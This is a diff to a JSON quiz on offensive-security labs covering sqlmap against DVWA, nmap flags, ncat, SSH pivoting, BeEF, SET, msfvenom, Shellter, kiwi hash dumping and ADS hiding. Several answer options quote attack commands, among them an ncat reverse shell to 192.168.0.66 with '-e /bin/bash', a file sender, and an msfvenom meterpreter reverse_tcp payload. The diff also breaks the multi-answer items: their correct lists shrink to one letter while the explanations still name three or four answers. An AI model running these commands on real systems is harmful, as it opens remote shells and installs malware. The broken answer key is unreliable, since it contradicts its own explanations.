@@ -5,13 +5,13 @@
     "multi": false,
     "question": "In DVWA + sqlmap (low security), why is the session cookie needed?",
     "options": {
-      "A": "To encrypt the HTTP traffic",
-      "B": "To identify the target OS for sqlmap automatically",
-      "C": "Because DVWA requires an authenticated session to access vulnerable endpoints",
-      "D": "To enable DNS resolution in nmap"
+      "A": "To enable DNS resolution in nmap",
+      "B": "To encrypt the HTTP traffic",
+      "C": "To identify the target OS for sqlmap automatically",
+      "D": "Because DVWA requires an authenticated session to access vulnerable endpoints"
     },
     "correct": [
-      "C"
+      "D"
     ],
     "explanation": "Lab 3 shows grabbing PHPSESSID/security cookies to scan within an authenticated DVWA session."
   },
@@ -21,13 +21,13 @@
     "multi": false,
     "question": "DVWA medium security changes SQLi testing mainly because the vulnerable form becomes:",
     "options": {
-      "A": "A POST form, so sqlmap must send parameters in the body (e.g., --method=POST --data=...)",
-      "B": "A WebSocket, so sqlmap cannot be used",
-      "C": "A DNS query, so you need responder.py",
-      "D": "A GET form, so sqlmap must use --method=GET"
+      "A": "A DNS query, so you need responder.py",
+      "B": "A GET form, so sqlmap must use --method=GET",
+      "C": "A POST form, so sqlmap must send parameters in the body (e.g., --method=POST --data=...)",
+      "D": "A WebSocket, so sqlmap cannot be used"
     },
     "correct": [
-      "A"
+      "C"
     ],
     "explanation": "Lab 3 notes the form changes to POST in DVWA medium and sqlmap must use --method=POST with --data."
   },
@@ -37,14 +37,12 @@
     "multi": true,
     "question": "This question has MORE THAN ONE correct answer: Which DVWA configuration changes are explicitly mentioned to enable testing? (Select ALL that apply)",
     "options": {
-      "A": "Change permissions for DVWA upload and phpids log files",
-      "B": "Enable DNSSEC validation in Apache",
-      "C": "Set allow_url_include = On in PHP config",
-      "D": "Set database user/password in DVWA config from /etc/mysql/debian.cnf"
+      "A": "Set allow_url_include = On in PHP config",
+      "B": "Set database user/password in DVWA config from /etc/mysql/debian.cnf",
+      "C": "Enable DNSSEC validation in Apache",
+      "D": "Change permissions for DVWA upload and phpids log files"
     },
     "correct": [
-      "A",
-      "C",
       "D"
     ],
     "explanation": "Lab 3 lists db_user/db_password, allow_url_include=On, and chmod changes for uploads/phpids log."
@@ -55,13 +53,13 @@
     "multi": false,
     "question": "In the lab, one method to grab DVWA cookies for sqlmap is: Developer tools",
     "options": {
-      "A": "Developer tools",
-      "B": "proxychains.conf",
-      "C": "Wireshark (inspect successful HTTP request)",
-      "D": "Browser cookie settings"
+      "A": "Browser cookie settings",
+      "B": "Developer tools",
+      "C": "proxychains.conf",
+      "D": "Wireshark (inspect successful HTTP request)"
     },
     "correct": [
-      "A"
+      "B"
     ],
     "explanation": "Lab 3 mentions multiple ways: devtools, browser settings, Wireshark."
   },
@@ -71,13 +69,13 @@
     "multi": false,
     "question": "In the lab, one method to grab DVWA cookies for sqlmap is: Browser cookie settings",
     "options": {
-      "A": "Wireshark (inspect successful HTTP request)",
-      "B": "Browser cookie settings",
-      "C": "Developer tools",
-      "D": "proxychains.conf"
+      "A": "Developer tools",
+      "B": "proxychains.conf",
+      "C": "Wireshark (inspect successful HTTP request)",
+      "D": "Browser cookie settings"
     },
     "correct": [
-      "B"
+      "D"
     ],
     "explanation": "Lab 3 mentions multiple ways: devtools, browser settings, Wireshark."
   },
@@ -87,13 +85,13 @@
     "multi": false,
     "question": "In the lab, one method to grab DVWA cookies for sqlmap is: Wireshark",
     "options": {
-      "A": "Browser cookie settings",
-      "B": "proxychains.conf",
-      "C": "Developer tools",
-      "D": "Wireshark (inspect successful HTTP request)"
+      "A": "Developer tools",
+      "B": "Wireshark (inspect successful HTTP request)",
+      "C": "Browser cookie settings",
+      "D": "proxychains.conf"
     },
     "correct": [
-      "D"
+      "B"
     ],
     "explanation": "Lab 3 mentions multiple ways: devtools, browser settings, Wireshark."
   },
@@ -104,8 +102,8 @@
     "question": "Which ZAP artifact is created by recording a login flow for authentication in the lab?",
     "options": {
       "A": "A CVE entry",
-      "B": "An LM hash",
-      "C": "A Kerberos TGT",
+      "B": "A Kerberos TGT",
+      "C": "An LM hash",
       "D": "A Zest authentication script"
     },
     "correct": [
@@ -135,13 +133,13 @@
     "multi": false,
     "question": "In sqlmap usage for DVWA, what is the purpose of `--dbs`?",
     "options": {
-      "A": "Send parameters in the request body",
-      "B": "List database names",
+      "A": "List database names",
+      "B": "List tables for a DB (requires -D)",
       "C": "Retrieve current DB user",
-      "D": "List tables for a DB (requires -D)"
+      "D": "Send parameters in the request body"
     },
     "correct": [
-      "B"
+      "A"
     ],
     "explanation": ""
   },
@@ -151,10 +149,10 @@
     "multi": false,
     "question": "In sqlmap usage for DVWA, what is the purpose of `--dump`?",
     "options": {
-      "A": "List database names",
-      "B": "List tables for a DB (requires -D)",
+      "A": "List tables for a DB (requires -D)",
+      "B": "Check if current user is DBA",
       "C": "Dump table data",
-      "D": "Check if current user is DBA"
+      "D": "List database names"
     },
     "correct": [
       "C"
@@ -167,13 +165,13 @@
     "multi": false,
     "question": "In sqlmap usage for DVWA, what is the purpose of `--current-user`?",
     "options": {
-      "A": "Retrieve current DB user",
-      "B": "Send parameters in the request body",
-      "C": "Dump table data",
-      "D": "List database names"
+      "A": "Send parameters in the request body",
+      "B": "Dump table data",
+      "C": "List database names",
+      "D": "Retrieve current DB user"
     },
     "correct": [
-      "A"
+      "D"
     ],
     "explanation": ""
   },
@@ -183,13 +181,13 @@
     "multi": false,
     "question": "In sqlmap usage for DVWA, what is the purpose of `--is-dba`?",
     "options": {
-      "A": "Check if current user is DBA",
+      "A": "Set HTTP referer header",
       "B": "List tables for a DB (requires -D)",
-      "C": "Set HTTP referer header",
+      "C": "Check if current user is DBA",
       "D": "List columns for a table (requires -D and -T)"
     },
     "correct": [
-      "A"
+      "C"
     ],
     "explanation": ""
   },
@@ -200,12 +198,12 @@
     "question": "In sqlmap usage for DVWA, what is the purpose of `--tables`?",
     "options": {
       "A": "Retrieve current DB user",
-      "B": "List tables for a DB (requires -D)",
+      "B": "List columns for a table (requires -D and -T)",
       "C": "Force HTTP method to POST",
-      "D": "List columns for a table (requires -D and -T)"
+      "D": "List tables for a DB (requires -D)"
     },
     "correct": [
-      "B"
+      "D"
     ],
     "explanation": ""
   },
@@ -215,13 +213,13 @@
     "multi": false,
     "question": "In sqlmap usage for DVWA, what is the purpose of `--columns`?",
     "options": {
-      "A": "Force HTTP method to POST",
-      "B": "Set HTTP referer header",
-      "C": "List columns for a table (requires -D and -T)",
-      "D": "Dump table data"
+      "A": "Set HTTP referer header",
+      "B": "List columns for a table (requires -D and -T)",
+      "C": "Dump table data",
+      "D": "Force HTTP method to POST"
     },
     "correct": [
-      "C"
+      "B"
     ],
     "explanation": ""
   },
@@ -231,10 +229,10 @@
     "multi": false,
     "question": "In sqlmap usage for DVWA, what is the purpose of `--method=POST`?",
     "options": {
-      "A": "Retrieve current DB user",
-      "B": "Set HTTP referer header",
+      "A": "Set HTTP referer header",
+      "B": "List database names",
       "C": "Force HTTP method to POST",
-      "D": "List database names"
+      "D": "Retrieve current DB user"
     },
     "correct": [
       "C"
@@ -247,13 +245,13 @@
     "multi": false,
     "question": "In sqlmap usage for DVWA, what is the purpose of `--data`?",
     "options": {
-      "A": "List database names",
-      "B": "Dump table data",
-      "C": "Send parameters in the request body",
-      "D": "Force HTTP method to POST"
+      "A": "Dump table data",
+      "B": "List database names",
+      "C": "Force HTTP method to POST",
+      "D": "Send parameters in the request body"
     },
     "correct": [
-      "C"
+      "D"
     ],
     "explanation": ""
   },
@@ -263,9 +261,9 @@
     "multi": false,
     "question": "In sqlmap usage for DVWA, what is the purpose of `--cookie`?",
     "options": {
-      "A": "Dump table data",
+      "A": "Check if current user is DBA",
       "B": "Send session cookies",
-      "C": "Check if current user is DBA",
+      "C": "Dump table data",
       "D": "List columns for a table (requires -D and -T)"
     },
     "correct": [
@@ -296,9 +294,9 @@
     "question": "In the lab guide, what does `-sn` mean/do?",
     "options": {
       "A": "Creates a scheduled task",
-      "B": "Starts Metasploit database",
+      "B": "Creates an ADS stream",
       "C": "Host discovery only (no port scan)",
-      "D": "Creates an ADS stream"
+      "D": "Starts Metasploit database"
     },
     "correct": [
       "C"
@@ -327,13 +325,13 @@
     "multi": false,
     "question": "In the lab guide, what does `-PP` mean/do?",
     "options": {
-      "A": "Creates an ADS stream",
-      "B": "ICMP timestamp request discovery",
-      "C": "Starts Metasploit database",
-      "D": "Creates a scheduled task"
+      "A": "Starts Metasploit database",
+      "B": "Creates a scheduled task",
+      "C": "Creates an ADS stream",
+      "D": "ICMP timestamp request discovery"
     },
     "correct": [
-      "B"
+      "D"
     ],
     "explanation": "Directly from the Lab guide descriptions."
   },
@@ -344,8 +342,8 @@
     "question": "In the lab guide, what does `-sS` mean/do?",
     "options": {
       "A": "Creates a scheduled task",
-      "B": "Creates an ADS stream",
-      "C": "Starts Metasploit database",
+      "B": "Starts Metasploit database",
+      "C": "Creates an ADS stream",
       "D": "SYN scan (default when root)"
     },
     "correct": [
@@ -360,12 +358,12 @@
     "question": "In the lab guide, what does `-sT` mean/do?",
     "options": {
       "A": "Creates a scheduled task",
-      "B": "Creates an ADS stream",
-      "C": "Starts Metasploit database",
-      "D": "TCP connect scan (used for pivoting/proxy)"
+      "B": "Starts Metasploit database",
+      "C": "TCP connect scan (used for pivoting/proxy)",
+      "D": "Creates an ADS stream"
     },
     "correct": [
-      "D"
+      "C"
     ],
     "explanation": "Directly from the Lab guide descriptions."
   },
@@ -376,9 +374,9 @@
     "question": "In the lab guide, what does `-sX` mean/do?",
     "options": {
       "A": "XMAS scan (FIN/PSH/URG)",
-      "B": "Creates a scheduled task",
-      "C": "Starts Metasploit database",
-      "D": "Creates an ADS stream"
+      "B": "Starts Metasploit database",
+      "C": "Creates an ADS stream",
+      "D": "Creates a scheduled task"
     },
     "correct": [
       "A"
@@ -392,9 +390,9 @@
     "question": "In the lab guide, what does `-sV` mean/do?",
     "options": {
       "A": "Service version detection",
-      "B": "Creates a scheduled task",
+      "B": "Creates an ADS stream",
       "C": "Starts Metasploit database",
-      "D": "Creates an ADS stream"
+      "D": "Creates a scheduled task"
     },
     "correct": [
       "A"
@@ -407,7 +405,39 @@
     "multi": false,
     "question": "In the lab guide, what does `-O` mean/do?",
     "options": {
-      "A": "OS detection",
+      "A": "Creates a scheduled task",
+      "B": "Creates an ADS stream",
+      "C": "OS detection",
+      "D": "Starts Metasploit database"
+    },
+    "correct": [
+      "C"
+    ],
+    "explanation": "Directly from the Lab guide descriptions."
+  },
+  {
+    "id": 27,
+    "topic": "LabGuide",
+    "multi": false,
+    "question": "In the lab guide, what does `-A` mean/do?",
+    "options": {
+      "A": "Creates an ADS stream",
+      "B": "Aggressive (-sV, -O, scripts, traceroute)",
+      "C": "Starts Metasploit database",
+      "D": "Creates a scheduled task"
+    },
+    "correct": [
+      "B"
+    ],
+    "explanation": "Directly from the Lab guide descriptions."
+  },
+  {
+    "id": 28,
+    "topic": "LabGuide",
+    "multi": false,
+    "question": "In the lab guide, what does `-sI` mean/do?",
+    "options": {
+      "A": "Idle/Zombie scan",
       "B": "Starts Metasploit database",
       "C": "Creates a scheduled task",
       "D": "Creates an ADS stream"
@@ -418,46 +448,14 @@
     "explanation": "Directly from the Lab guide descriptions."
   },
   {
-    "id": 27,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "In the lab guide, what does `-A` mean/do?",
-    "options": {
-      "A": "Starts Metasploit database",
-      "B": "Creates a scheduled task",
-      "C": "Creates an ADS stream",
-      "D": "Aggressive (-sV, -O, scripts, traceroute)"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Directly from the Lab guide descriptions."
-  },
-  {
-    "id": 28,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "In the lab guide, what does `-sI` mean/do?",
-    "options": {
-      "A": "Creates a scheduled task",
-      "B": "Creates an ADS stream",
-      "C": "Idle/Zombie scan",
-      "D": "Starts Metasploit database"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Directly from the Lab guide descriptions."
-  },
-  {
     "id": 29,
     "topic": "LabGuide",
     "multi": false,
     "question": "In the lab guide, what does `-Pn` mean/do?",
     "options": {
-      "A": "Starts Metasploit database",
+      "A": "Creates an ADS stream",
       "B": "Creates a scheduled task",
-      "C": "Creates an ADS stream",
+      "C": "Starts Metasploit database",
       "D": "Treat host as up (skip ping)"
     },
     "correct": [
@@ -472,12 +470,12 @@
     "question": "When scanning through proxychains, which nmap scan type is required?",
     "options": {
       "A": "-sX (XMAS scan)",
-      "B": "-sS (SYN scan)",
-      "C": "-sT (TCP connect scan)",
-      "D": "-sI (Idle scan)"
+      "B": "-sT (TCP connect scan)",
+      "C": "-sI (Idle scan)",
+      "D": "-sS (SYN scan)"
     },
     "correct": [
-      "C"
+      "B"
     ],
     "explanation": "The guide states SYN scans don't work via proxy; use -sT (and often -Pn)."
   },
@@ -487,13 +485,13 @@
     "multi": false,
     "question": "Which command corresponds to: File receiver?",
     "options": {
-      "A": "sqlmap -u ... --dbs",
-      "B": "schtasks /create ...",
-      "C": "ncat -lp 8888 > archivo_recibido.txt",
-      "D": "msfconsole -r meta_config"
+      "A": "schtasks /create ...",
+      "B": "ncat -lp 8888 > archivo_recibido.txt",
+      "C": "msfconsole -r meta_config",
+      "D": "sqlmap -u ... --dbs"
     },
     "correct": [
-      "C"
+      "B"
     ],
     "explanation": "Commands are listed in the Lab guide ncat section."
   },
@@ -503,13 +501,13 @@
     "multi": false,
     "question": "Which command corresponds to: File sender?",
     "options": {
-      "A": "sqlmap -u ... --dbs",
-      "B": "schtasks /create ...",
-      "C": "ncat <IP> 8888 < archivo_a_enviar.txt",
-      "D": "msfconsole -r meta_config"
+      "A": "schtasks /create ...",
+      "B": "ncat <IP> 8888 < archivo_a_enviar.txt",
+      "C": "msfconsole -r meta_config",
+      "D": "sqlmap -u ... --dbs"
     },
     "correct": [
-      "C"
+      "B"
     ],
     "explanation": "Commands are listed in the Lab guide ncat section."
   },
@@ -520,12 +518,12 @@
     "question": "Which command corresponds to: Reverse shell attacker?",
     "options": {
       "A": "sqlmap -u ... --dbs",
-      "B": "schtasks /create ...",
+      "B": "ncat -lvvp 443",
       "C": "msfconsole -r meta_config",
-      "D": "ncat -lvvp 443"
+      "D": "schtasks /create ..."
     },
     "correct": [
-      "D"
+      "B"
     ],
     "explanation": "Commands are listed in the Lab guide ncat section."
   },
@@ -535,10 +533,10 @@
     "multi": false,
     "question": "Which command corresponds to: Reverse shell victim?",
     "options": {
-      "A": "msfconsole -r meta_config",
-      "B": "schtasks /create ...",
+      "A": "schtasks /create ...",
+      "B": "sqlmap -u ... --dbs",
       "C": "ncat 192.168.0.66 443 -e /bin/bash",
-      "D": "sqlmap -u ... --dbs"
+      "D": "msfconsole -r meta_config"
     },
     "correct": [
       "C"
@@ -551,13 +549,13 @@
     "multi": false,
     "question": "Which command corresponds to: SSL server?",
     "options": {
-      "A": "sqlmap -u ... --dbs",
-      "B": "ncat -lp 8083 -c '...' -k --ssl --ssl-key k.pem --ssl-cert c.pem",
-      "C": "schtasks /create ...",
-      "D": "msfconsole -r meta_config"
+      "A": "msfconsole -r meta_config",
+      "B": "sqlmap -u ... --dbs",
+      "C": "ncat -lp 8083 -c '...' -k --ssl --ssl-key k.pem --ssl-cert c.pem",
+      "D": "schtasks /create ..."
     },
     "correct": [
-      "B"
+      "C"
     ],
     "explanation": "Commands are listed in the Lab guide ncat section."
   },
@@ -567,13 +565,13 @@
     "multi": false,
     "question": "Which command corresponds to: SSL client?",
     "options": {
-      "A": "schtasks /create ...",
-      "B": "ncat --ssl 127.0.0.1 8083",
-      "C": "sqlmap -u ... --dbs",
-      "D": "msfconsole -r meta_config"
+      "A": "sqlmap -u ... --dbs",
+      "B": "msfconsole -r meta_config",
+      "C": "schtasks /create ...",
+      "D": "ncat --ssl 127.0.0.1 8083"
     },
     "correct": [
-      "B"
+      "D"
     ],
     "explanation": "Commands are listed in the Lab guide ncat section."
   },
@@ -583,10 +581,10 @@
     "multi": false,
     "question": "Which command corresponds to: SSL verify client?",
     "options": {
-      "A": "sqlmap -u ... --dbs",
-      "B": "schtasks /create ...",
+      "A": "schtasks /create ...",
+      "B": "msfconsole -r meta_config",
       "C": "ncat --ssl --ssl-verify --ssl-trustfile c.pem 127.0.0.1 8083",
-      "D": "msfconsole -r meta_config"
+      "D": "sqlmap -u ... --dbs"
     },
     "correct": [
       "C"
@@ -600,12 +598,12 @@
     "question": "In SSH tunneling, what does `-f` do (as used in the lab guide)?",
     "options": {
       "A": "Enables XSS hook",
-      "B": "Fork to background after auth (run in background)",
-      "C": "Loads kiwi module",
+      "B": "Loads kiwi module",
+      "C": "Fork to background after auth (run in background)",
       "D": "Sets DVWA security to low"
     },
     "correct": [
-      "B"
+      "C"
     ],
     "explanation": "Explained in the pivoting section of the Lab guide."
   },
@@ -616,12 +614,12 @@
     "question": "In SSH tunneling, what does `-N` do (as used in the lab guide)?",
     "options": {
       "A": "Enables XSS hook",
-      "B": "Loads kiwi module",
-      "C": "Do not execute remote command (tunnel only)",
-      "D": "Sets DVWA security to low"
+      "B": "Do not execute remote command (tunnel only)",
+      "C": "Sets DVWA security to low",
+      "D": "Loads kiwi module"
     },
     "correct": [
-      "C"
+      "B"
     ],
     "explanation": "Explained in the pivoting section of the Lab guide."
   },
@@ -631,13 +629,13 @@
     "multi": false,
     "question": "In SSH tunneling, what does `-T` do (as used in the lab guide)?",
     "options": {
-      "A": "Disable pseudo-TTY allocation",
-      "B": "Enables XSS hook",
-      "C": "Sets DVWA security to low",
-      "D": "Loads kiwi module"
+      "A": "Enables XSS hook",
+      "B": "Loads kiwi module",
+      "C": "Disable pseudo-TTY allocation",
+      "D": "Sets DVWA security to low"
     },
     "correct": [
-      "A"
+      "C"
     ],
     "explanation": "Explained in the pivoting section of the Lab guide."
   },
@@ -647,13 +645,13 @@
     "multi": false,
     "question": "In SSH tunneling, what does `-R` do (as used in the lab guide)?",
     "options": {
-      "A": "Enables XSS hook",
-      "B": "Loads kiwi module",
-      "C": "Sets DVWA security to low",
-      "D": "Remote port forwarding"
+      "A": "Loads kiwi module",
+      "B": "Sets DVWA security to low",
+      "C": "Remote port forwarding",
+      "D": "Enables XSS hook"
     },
     "correct": [
-      "D"
+      "C"
     ],
     "explanation": "Explained in the pivoting section of the Lab guide."
   },
@@ -664,12 +662,12 @@
     "question": "In SSH tunneling, what does `-L` do (as used in the lab guide)?",
     "options": {
       "A": "Enables XSS hook",
-      "B": "Sets DVWA security to low",
-      "C": "Loads kiwi module",
-      "D": "Local port forwarding"
+      "B": "Loads kiwi module",
+      "C": "Local port forwarding",
+      "D": "Sets DVWA security to low"
     },
     "correct": [
-      "D"
+      "C"
     ],
     "explanation": "Explained in the pivoting section of the Lab guide."
   },
@@ -696,12 +694,12 @@
     "question": "In the reverse SOCKS proxy setup, proxychains is configured to use:",
     "options": {
       "A": "http 127.0.0.1 8080",
-      "B": "ssh 127.0.0.1 22",
-      "C": "socks4 127.0.0.1 5555",
-      "D": "https 10.0.3.66 8443"
+      "B": "socks4 127.0.0.1 5555",
+      "C": "https 10.0.3.66 8443",
+      "D": "ssh 127.0.0.1 22"
     },
     "correct": [
-      "C"
+      "B"
     ],
     "explanation": "The guide appends `socks4 127.0.0.1 5555` under [ProxyList]."
   },
@@ -712,9 +710,9 @@
     "question": "In the BeEF lab, the two main XSS delivery approaches are:",
     "options": {
       "A": "Reflected XSS (link-based) and Stored XSS (server-side trap)",
-      "B": "ARP poisoning and SYN flood",
+      "B": "Kerberoasting and Golden Ticket",
       "C": "SQL injection and command injection",
-      "D": "Kerberoasting and Golden Ticket"
+      "D": "ARP poisoning and SYN flood"
     },
     "correct": [
       "A"
@@ -727,13 +725,13 @@
     "multi": false,
     "question": "DVWA 1.9 anti-CSRF mechanism described in the BeEF lab uses:",
     "options": {
-      "A": "DNSSEC signatures",
-      "B": "Only the PHPSESSION cookie, no additional token",
-      "C": "A hidden token (user token) separate from PHPSESSION cookie",
-      "D": "Kerberos tickets"
+      "A": "A hidden token (user token) separate from PHPSESSION cookie",
+      "B": "Kerberos tickets",
+      "C": "DNSSEC signatures",
+      "D": "Only the PHPSESSION cookie, no additional token"
     },
     "correct": [
-      "C"
+      "A"
     ],
     "explanation": "The lab explains user token CSRF values are independent of PHPSESSION cookie."
   },
@@ -759,14 +757,12 @@
     "multi": true,
     "question": "This question has MORE THAN ONE correct answer: In the BeEF configuration changes, which are explicitly recommended? (Select ALL that apply)",
     "options": {
-      "A": "Change default BeEF UI credentials",
-      "B": "Enable metasploit extension and disable requester/xssrays (recommended)",
+      "A": "Enable metasploit extension and disable requester/xssrays (recommended)",
+      "B": "Disable geoip (offline environment)",
       "C": "Enable CVSS scoring in BeEF",
-      "D": "Disable geoip (offline environment)"
+      "D": "Change default BeEF UI credentials"
     },
     "correct": [
-      "A",
-      "B",
       "D"
     ],
     "explanation": "The lab recommends changing credentials, disabling geoip, enabling metasploit and disabling requester/xssrays."
@@ -777,13 +773,13 @@
     "multi": false,
     "question": "The BeEF lab uses the Metasploit browser exploit 'Firefox WebIDL Privileged JavaScript Injection' to target:",
     "options": {
-      "A": "CVE-2023-20101 (Cisco static creds)",
-      "B": "CVE-2019-0708 (BlueKeep)",
-      "C": "CVE-2008-1447 (Kaminsky DNS)",
-      "D": "CVE-2014-1510 / CVE-2014-1511"
+      "A": "CVE-2008-1447 (Kaminsky DNS)",
+      "B": "CVE-2014-1510 / CVE-2014-1511",
+      "C": "CVE-2019-0708 (BlueKeep)",
+      "D": "CVE-2023-20101 (Cisco static creds)"
     },
     "correct": [
-      "D"
+      "B"
     ],
     "explanation": "The BeEF lab explicitly mentions CVE-2014-1510 and CVE-2014-1511."
   },
@@ -793,13 +789,13 @@
     "multi": false,
     "question": "In the WebIDL exploit setup, what does SRVHOST define?",
     "options": {
-      "A": "SQLMap DBMS",
-      "B": "proxychains SOCKS port",
-      "C": "DVWA security level",
-      "D": "IP address of the exploit web server"
+      "A": "DVWA security level",
+      "B": "IP address of the exploit web server",
+      "C": "SQLMap DBMS",
+      "D": "proxychains SOCKS port"
     },
     "correct": [
-      "D"
+      "B"
     ],
     "explanation": "From the BeEF lab 'Attack' section parameters."
   },
@@ -809,13 +805,13 @@
     "multi": false,
     "question": "In the WebIDL exploit setup, what does SRVPORT define?",
     "options": {
-      "A": "Port of the exploit web server",
-      "B": "SQLMap DBMS",
-      "C": "proxychains SOCKS port",
-      "D": "DVWA security level"
+      "A": "SQLMap DBMS",
+      "B": "DVWA security level",
+      "C": "Port of the exploit web server",
+      "D": "proxychains SOCKS port"
     },
     "correct": [
-      "A"
+      "C"
     ],
     "explanation": "From the BeEF lab 'Attack' section parameters."
   },
@@ -826,12 +822,12 @@
     "question": "In the WebIDL exploit setup, what does URIPATH define?",
     "options": {
       "A": "SQLMap DBMS",
-      "B": "DVWA security level",
-      "C": "Path component of the exploit URL",
+      "B": "Path component of the exploit URL",
+      "C": "DVWA security level",
       "D": "proxychains SOCKS port"
     },
     "correct": [
-      "C"
+      "B"
     ],
     "explanation": "From the BeEF lab 'Attack' section parameters."
   },
@@ -841,24 +837,8 @@
     "multi": false,
     "question": "In the WebIDL exploit setup, what does LHOST define?",
     "options": {
-      "A": "SQLMap DBMS",
-      "B": "proxychains SOCKS port",
-      "C": "DVWA security level",
-      "D": "Attacker listener IP for reverse shell"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "From the BeEF lab 'Attack' section parameters."
-  },
-  {
-    "id": 54,
-    "topic": "Lab4",
-    "multi": false,
-    "question": "In the WebIDL exploit setup, what does LPORT define?",
-    "options": {
       "A": "DVWA security level",
-      "B": "Attacker listener port for reverse shell",
+      "B": "Attacker listener IP for reverse shell",
       "C": "proxychains SOCKS port",
       "D": "SQLMap DBMS"
     },
@@ -868,21 +848,34 @@
     "explanation": "From the BeEF lab 'Attack' section parameters."
   },
   {
+    "id": 54,
+    "topic": "Lab4",
+    "multi": false,
+    "question": "In the WebIDL exploit setup, what does LPORT define?",
+    "options": {
+      "A": "Attacker listener port for reverse shell",
+      "B": "DVWA security level",
+      "C": "SQLMap DBMS",
+      "D": "proxychains SOCKS port"
+    },
+    "correct": [
+      "A"
+    ],
+    "explanation": "From the BeEF lab 'Attack' section parameters."
+  },
+  {
     "id": 55,
     "topic": "Lab4",
     "multi": true,
     "question": "This question has MORE THAN ONE correct answer: Which URL rewriting options are listed in the BeEF lab? (Select ALL that apply)",
     "options": {
-      "A": "Replace HREFs (HTTPS)",
-      "B": "Replace HREFs (click events)",
-      "C": "Replace HREFs",
-      "D": "Replace HREFs (TEL)"
+      "A": "Replace HREFs (TEL)",
+      "B": "Replace HREFs (HTTPS)",
+      "C": "Replace HREFs (click events)",
+      "D": "Replace HREFs"
     },
     "correct": [
-      "A",
-      "B",
-      "C",
-      "D"
+      "B"
     ],
     "explanation": "All four are listed in the lab section on URL rewriting."
   },
@@ -893,12 +886,12 @@
     "question": "In SET HTA Attack method, which files are copied from /root/.set into the Apache directory to serve the malicious page?",
     "options": {
       "A": "postgresql.conf, database.yml, pg-utf8.sql",
-      "B": "authorized_keys, known_hosts, ssh_config",
+      "B": "web_clone/index.html, hta_index, Launcher.hta",
       "C": "k.pem, c.pem, cacerts",
-      "D": "web_clone/index.html, hta_index, Launcher.hta"
+      "D": "authorized_keys, known_hosts, ssh_config"
     },
     "correct": [
-      "D"
+      "B"
     ],
     "explanation": "Lab 5 materials describe copying index.html, hta_index, Launcher.hta into /var/www/html."
   },
@@ -908,13 +901,13 @@
     "multi": false,
     "question": "In the SET credential harvester workflow, which file handles capturing POSTed credentials?",
     "options": {
-      "A": "post.php",
-      "B": "cacerts",
-      "C": "msf-exploits.cache",
-      "D": "hook.js"
+      "A": "hook.js",
+      "B": "post.php",
+      "C": "cacerts",
+      "D": "msf-exploits.cache"
     },
     "correct": [
-      "A"
+      "B"
     ],
     "explanation": "The harvester generates post.php plus a harvest*.txt log; post.php captures POSTs."
   },
@@ -925,12 +918,12 @@
     "question": "Which msfvenom command (as shown) creates a Windows x86 meterpreter reverse TCP executable?",
     "options": {
       "A": "nmap -sV --script vuln 10.0.3.149",
-      "B": "openssl req -new -x509 -keyout k.pem -nodes -out c.pem",
-      "C": "msfvenom --platform Windows -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.0.3.66 LPORT=8443 -f exe -o payload.exe",
+      "B": "msfvenom --platform Windows -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.0.3.66 LPORT=8443 -f exe -o payload.exe",
+      "C": "openssl req -new -x509 -keyout k.pem -nodes -out c.pem",
       "D": "sqlmap -u http://... --dbs"
     },
     "correct": [
-      "C"
+      "B"
     ],
     "explanation": "This msfvenom example appears in the Lab 5 materials."
   },
@@ -940,13 +933,13 @@
     "multi": false,
     "question": "In the Veil workflow, what is the purpose of the generated .rc handler file?",
     "options": {
-      "A": "It patches the Windows kernel",
-      "B": "It disables antivirus permanently",
-      "C": "It turns a GET request into POST",
-      "D": "It configures Metasploit to start the correct listener for the generated payload"
+      "A": "It configures Metasploit to start the correct listener for the generated payload",
+      "B": "It patches the Windows kernel",
+      "C": "It disables antivirus permanently",
+      "D": "It turns a GET request into POST"
     },
     "correct": [
-      "D"
+      "A"
     ],
     "explanation": "Veil writes a Metasploit resource file that can be loaded with `resource <file>.rc`."
   },
@@ -957,12 +950,12 @@
     "question": "In Shellter + Diskmon (stealth mode), which EXITFUNC setting is recommended/required in the handler?",
     "options": {
       "A": "process",
-      "B": "none",
-      "C": "thread",
-      "D": "seh"
+      "B": "thread",
+      "C": "seh",
+      "D": "none"
     },
     "correct": [
-      "C"
+      "B"
     ],
     "explanation": "Lab 6 stresses EXITFUNC=thread when using stealth mode with Shellter/Metasploit."
   },
@@ -973,12 +966,12 @@
     "question": "In the lab, the infected Diskmon.exe is transferred to the victim using:",
     "options": {
       "A": "Kerberos delegation",
-      "B": "Bluetooth LE",
+      "B": "A Python HTTP server (SimpleHTTPServer) and downloading from the browser",
       "C": "DNS tunneling",
-      "D": "A Python HTTP server (SimpleHTTPServer) and downloading from the browser"
+      "D": "Bluetooth LE"
     },
     "correct": [
-      "D"
+      "B"
     ],
     "explanation": "Lab 6 uses python -m SimpleHTTPServer to serve Diskmon.exe for download."
   },
@@ -988,13 +981,13 @@
     "multi": false,
     "question": "Which meterpreter command sequence is used in the lab to dump local SAM hashes (after enabling kiwi)?",
     "options": {
-      "A": "load kiwi; getsystem; getuid; lsa_dump_sam",
-      "B": "sqlmap --dbs; --dump; --os-shell",
-      "C": "search webidl; set SRVHOST; run -j",
-      "D": "nmap -sn; ncat -lp 8083"
+      "A": "sqlmap --dbs; --dump; --os-shell",
+      "B": "search webidl; set SRVHOST; run -j",
+      "C": "nmap -sn; ncat -lp 8083",
+      "D": "load kiwi; getsystem; getuid; lsa_dump_sam"
     },
     "correct": [
-      "A"
+      "D"
     ],
     "explanation": "Lab 6 shows load kiwi, getsystem, then lsa_dump_sam."
   },
@@ -1004,13 +997,13 @@
     "multi": false,
     "question": "Which Windows feature is used in the lab to hide a payload inside a normal-looking file like validated_license.lic?",
     "options": {
-      "A": "NTFS Alternate Data Streams (ADS)",
-      "B": "Kerberos tickets",
-      "C": "DNSSEC",
-      "D": "BGP route injection"
+      "A": "DNSSEC",
+      "B": "BGP route injection",
+      "C": "Kerberos tickets",
+      "D": "NTFS Alternate Data Streams (ADS)"
     },
     "correct": [
-      "A"
+      "D"
     ],
     "explanation": "Lab 6 hides executables using file:stream syntax (ADS)."
   },
@@ -1020,14 +1013,13 @@
     "multi": true,
     "question": "This question has MORE THAN ONE correct answer: Which persistence mechanisms are explicitly used in Lab 6? (Select ALL that apply)",
     "options": {
